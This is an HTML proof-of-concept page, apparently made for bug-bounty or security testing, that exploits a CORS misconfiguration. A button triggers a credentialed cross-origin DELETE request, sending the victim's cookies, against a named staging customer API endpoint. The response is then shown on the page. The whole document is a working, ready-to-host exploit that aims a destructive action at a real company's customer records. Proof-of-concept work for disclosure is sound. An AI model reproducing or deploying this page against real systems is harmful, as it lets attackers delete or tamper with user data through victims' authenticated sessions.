<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS PoC</title>
    <script>
        function makeCorsRequest() {
            var xhttp = new XMLHttpRequest();
            // Change this URL to the vulnerable API endpoint
            var url = "https://api.staging.my.zalora.net/v1/customers/";

            xhttp.open("DELETE", url, true);
            xhttp.withCredentials = true; // Important for sending cookies

            xhttp.onload = function () {
                if (xhttp.status >= 200 && xhttp.status < 300) {
                    document.getElementById("response").textContent = "Response: " + xhttp.responseText;
                } else {
                    document.getElementById("response").textContent = "Request failed with status: " + xhttp.status;
                }
            };

            xhttp.onerror = function () {
                document.getElementById("response").textContent = "Request failed";
            };

            xhttp.send();
        }
    </script>
</head>
<body>
    <h1>CORS PoC</h1>
    <button onclick="makeCorsRequest()">Make CORS Request</button>
    <pre id="response"></pre>
</body>
</html>
